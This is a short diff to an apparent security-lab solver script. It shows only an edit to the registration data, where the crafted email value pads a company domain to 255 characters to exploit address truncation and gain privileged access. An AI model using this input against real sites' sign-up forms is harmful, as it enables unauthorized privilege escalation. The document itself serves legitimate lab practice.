@@ -19,7 +19,7 @@ def solve_lab(session):
     logger.info("Registering an account with the following data:")
     data = {
         "csrf": csrf,
-        "username": f"attacker",
+        "username": "attacker",
         "email": f"{'dontwannacry.com'.zfill(255)}{email_client.address}",
         "password": "123456",
     }
